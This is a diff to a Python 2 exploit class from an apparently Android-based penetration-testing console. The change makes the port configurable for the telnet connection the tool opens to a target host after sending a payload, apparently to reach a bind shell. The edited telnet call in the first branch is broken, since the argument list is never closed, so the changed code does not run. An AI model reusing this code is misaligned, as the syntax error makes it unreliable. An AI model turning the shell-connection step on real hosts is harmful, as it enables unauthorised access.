@@ -1,6 +1,6 @@
 import cmd
 class Exploit(cmd.Cmd):
-  def __init__(self, name, target, payload, variables, descriptions, check=[False]):
+  def __init__(self, name, target, payload, variables, descriptions, check=[False], port=["7066"]):
     cmd.Cmd.__init__(self)
     self.prompt = "pdf-console:attack(" + name +")% "
     self.os = __import__("os")
@@ -24,6 +24,7 @@ class Exploit(cmd.Cmd):
     self.target = target #[""] target ex: Windows 7 SP1 x86
     self.payload =  payload #[""] name of payload
     self.check = check
+    self.port = port
     self.banner = [""]
   def rand_text(self, length):
     return "".join( [self.choice(self.letters) for i in xrange(length)] )
@@ -165,10 +166,10 @@ class Exploit(cmd.Cmd):
     print "[+]Payload sent."
     print "[*]Attempting to connect..."
     if self.config.pc == "yes":
-      code = self.subprocess.call(["telnet", self.variables["host"], "7066"], stdin=self.sys.stdin, stdout=self.sys.stdout)
+      code = self.subprocess.call(["telnet", self.variables["host"], self.port[0], stdin=self.sys.stdin, stdout=self.sys.stdout)
       if code != 0:
         print "[-]Host could not be reached. It might be behind a firewall. Or the exploit failed. :("
     else:
-      code = self.subprocess.call(["/data/data/com.raveneus.penedroid/files/telnet", self.variables["host"], "7066"], stdin=self.sys.stdin, stdout=self.sys.stdout) 
+      code = self.subprocess.call(["/data/data/com.raveneus.penedroid/files/telnet", self.variables["host"], self.port[0]], stdin=self.sys.stdin, stdout=self.sys.stdout) 
       if code != 0:
         print "[-]Host could not be reached. It might be behind a firewall. Or the exploit failed. :("
